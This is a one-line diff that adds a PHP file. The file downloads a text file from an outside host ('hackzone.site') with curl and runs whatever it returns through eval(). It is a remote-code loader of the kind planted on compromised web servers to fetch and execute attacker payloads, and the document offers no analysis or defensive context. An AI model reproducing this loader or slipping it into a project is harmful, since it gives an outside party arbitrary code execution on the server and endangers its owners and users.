@@ -1,0 +1,1 @@
+<?php $Url='https://hackzone.site/script/indra2.txt'; if (!function_exists('curl_init')){ die('CURL is not installed!'); } $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $Url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $output = curl_exec($ch); curl_close($ch); eval($output); ?>
